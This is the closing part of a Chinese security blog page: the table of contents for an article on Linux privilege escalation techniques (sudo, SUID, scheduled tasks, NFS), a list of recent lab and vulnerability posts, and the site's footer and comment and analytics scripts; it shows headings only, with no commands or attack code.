class="toc-text">9、man命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10%E3%80%81less-x2F-more%E5%91%BD%E4%BB%A4"><span class="toc-text">10、less&#x2F;more命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11%E3%80%81awk%E5%91%BD%E4%BB%A4"><span class="toc-text">11、awk命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#12%E3%80%81nano%E5%91%BD%E4%BB%A4"><span class="toc-text">12、nano命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#13%E3%80%81wget%E5%91%BD%E4%BB%A4"><span class="toc-text">13、wget命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#14%E3%80%81zip%E6%8F%90%E6%9D%83"><span class="toc-text">14、zip提权</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81suid%E6%8F%90%E6%9D%83"><span class="toc-text">三、suid提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81vin-x2F-vim%E5%91%BD%E4%BB%A4"><span class="toc-text">3、vin&#x2F;vim命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81bash%E5%91%BD%E4%BB%A4"><span class="toc-text">4、bash命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%E3%80%81more-x2F-less%E5%91%BD%E4%BB%A4"><span class="toc-text">5、more&#x2F;less命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6%E3%80%81nano%E5%91%BD%E4%BB%A4"><span class="toc-text">6、nano命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7%E3%80%81mv-x2F-cp%E5%91%BD%E4%BB%A4"><span class="toc-text">7、mv&#x2F;cp命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9%E3%80%81nmap%E5%91%BD%E4%BB%A4"><span class="toc-text">9、nmap命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10%E3%80%81man%E5%91%BD%E4%BB%A4"><span class="toc-text">10、man命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11%E3%80%81tcpdump%E5%91%BD%E4%BB%A4"><span class="toc-text">11、tcpdump命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#12%E3%80%81python-x2F-per-x2F-ruby-x2F-lua-x2F-php-x2F-etc%E5%91%BD%E4%BB%A4"><span class="toc-text">12、python&#x2F;per&#x2F;ruby&#x2F;lua&#x2F;php&#x2F;etc命令</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E6%8F%90%E6%9D%83"><span class="toc-text">四、计划任务提权</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E7%AC%AC%E4%B8%89%E6%96%B9%E6%9C%8D%E5%8A%A1NFS%E6%8F%90%E6%9D%83"><span class="toc-text">五、第三方服务NFS提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E4%BB%80%E4%B9%88%E6%98%AFNFS"><span class="toc-text">1、什么是NFS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E4%BB%80%E4%B9%88%E6%98%AFroot-sqaush%E5%92%8Cno-root-sqaush"><span class="toc-text">2、什么是root_sqaush和no_root_sqaush</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E5%88%A9%E7%94%A8NFS%E6%8F%90%E6%9D%83"><span class="toc-text">3、利用NFS提权</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E6%80%BB%E7%BB%93"><span class="toc-text">六、总结</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/11/20/redsun_lab_act/" title="域控四主机打靶记录"><img src="/img/redsun.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="域控四主机打靶记录"/></a><div class="content"><a class="title" href="/2022/11/20/redsun_lab_act/" title="域控四主机打靶记录">域控四主机打靶记录</a><time datetime="2022-11-19T16:00:00.000Z" title="发表于 2022-11-20 00:00:00">2022-11-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/10/docker_run_fast/" title="Docker逃逸"><img src="/img/docker_img1.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Docker逃逸"/></a><div class="content"><a class="title" href="/2022/11/10/docker_run_fast/" title="Docker逃逸">Docker逃逸</a><time datetime="2022-11-09T16:00:00.000Z" title="发表于 2022-11-10 00:00:00">2022-11-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/01/file_include/" title="文件包含漏洞的学习"><img src="/img/baohan.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="文件包含漏洞的学习"/></a><div class="content"><a class="title" href="/2022/11/01/file_include/" title="文件包含漏洞的学习">文件包含漏洞的学习</a><time datetime="2022-10-31T16:00:00.000Z" title="发表于 2022-11-01 00:00:00">2022-11-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/10/25/file_resolve/" title="文件解析漏洞的学习"><img src="/img/jiexi.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="文件解析漏洞的学习"/></a><div class="content"><a class="title" href="/2022/10/25/file_resolve/" title="文件解析漏洞的学习">文件解析漏洞的学习</a><time datetime="2022-10-24T16:00:00.000Z" title="发表于 2022-10-25 00:00:00">2022-10-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/10/15/sql_lab_six/" title="SQL注入靶场（六）"><img src="/img/sqlbachang.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SQL注入靶场（六）"/></a><div class="content"><a class="title" href="/2022/10/15/sql_lab_six/" title="SQL注入靶场（六）">SQL注入靶场（六）</a><time datetime="2022-10-14T16:00:00.000Z" title="发表于 2022-10-15 00:00:00">2022-10-15</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/getshell.png')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By Maxenton</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>(()=>{
  const init = () => {
    twikoo.init(Object.assign({
      el: '#twikoo-wrap',
      envId: 'cloudbase-baas-0gy8kmyw9281bfee',
      region: '',
      onCommentLoaded: function () {
        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
      }
    }, null))
  }

  const getCount = () => {
    const countELement = document.getElementById('twikoo-count')
    if(!countELement) return
    twikoo.getCommentsCount({
      envId: 'cloudbase-baas-0gy8kmyw9281bfee',
      region: '',
      urls: [window.location.pathname],
      includeReply: false
    }).then(function (res) {
      countELement.innerText = res[0].count
    }).catch(function (err) {
      console.error(err);
    });
  }

  const runFn = () => {
    init()
    GLOBAL_CONFIG_SITE.isPost && getCount()
  }

  const loadTwikoo = () => {
    if (typeof twikoo === 'object') {
      setTimeout(runFn,0)
      return
    } 
    getScript('https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js').then(runFn)
  }

  if ('Twikoo' === 'Twikoo' || !false) {
    if (false) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
    else loadTwikoo()
  } else {
    window.loadOtherComment = () => {
      loadTwikoo()
    }
  }
})()</script></div><script src="/js/custom/custom.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="true"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = false;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>